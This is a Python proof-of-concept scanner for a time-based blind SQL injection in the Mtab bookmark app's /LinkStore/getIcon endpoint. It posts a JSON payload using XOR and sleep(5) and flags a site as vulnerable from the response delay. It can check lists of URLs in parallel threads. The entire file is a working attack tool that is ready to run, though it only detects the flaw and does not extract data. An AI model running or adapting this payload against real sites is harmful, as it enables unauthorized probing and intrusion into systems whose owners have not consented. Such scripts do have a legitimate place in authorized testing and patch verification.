import requests
import argparse
import threading
import sys
import time


def SMH(url,result):
    create_url = url+"/LinkStore/getIcon"

    data='''{"url":"'XOR(if(now()=sysdate(),sleep(5),0))XOR'"}'''
    headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
             "Content-Type":"application/json",
             "Content-Length":"50",
               "X-Requested-With":"XMLHttpRequest",
               "Connection":"Keep-alive"}

    try:
        start_time = time.time()
        req = requests.post(create_url,data=data,headers=headers,timeout=8)
        end_time = time.time()
        req_time = end_time - start_time
        # print(req.text) 测试响应包中返回的数据
        if(req.status_code==200):
            if(req_time>=5):
                print(f"【+】{url}存在相关SQL注入漏洞")
                result.append(url)
            else:
                print(f"【-】{url}不存在相关SQL注入漏洞")
    except:
        print(f"【-】{url}无法访问或网络连接错误")

def SMH_counts(filename):
    result = []
    try:
        with open(filename,"r") as file:
            urls = file.readlines()
            threads = []
            for url in urls:
                url = url.strip()
                thread = threading.Thread(target=SMH,args=(url,result))
                threads.append(thread)
                thread.start()
            for thread in threads:
                thread.join()

        if result:
            print("\n存在SQL注入漏洞的URL如下：")
            for vulnerable_url in result:
                print(vulnerable_url)
        else:
            print("\n未发现任何存在SQL注入漏洞的URL。")
    except Exception as e:
        print(f"发生错误: {str(e)}")

def start():
    logo=''' ___ ___  ______   ____  ____  
|   T   T|      T /    T|    \ 
| _   _ ||      |Y  o  ||  o  )
|  \_/  |l_j  l_j|     ||     T
|   |   |  |  |  |  _  ||  O  |
|   |   |  |  |  |  |  ||     |
l___j___j  l__j  l__j__jl_____j                     
'''
    print(logo)
    print("脚本由 YZX100 编写")

def main():
    parser = argparse.ArgumentParser(description="Mtab书签导航程序getIcon检测SQL注入脚本")
    parser.add_argument('-u',type=str,help='检测单个url')
    parser.add_argument('-f', type=str, help='批量检测url列表文件')
    args = parser.parse_args()
    if args.u:
        result = []
        SMH(args.u, result)
        if result:
            print("\n存在SQL注入漏洞的URL如下：")
            for vulnerable_url in result:
                print(vulnerable_url)
    elif args.f:
        SMH_counts(args.f)
    else:
        parser.print_help()


if __name__ == "__main__":
    start()
    main()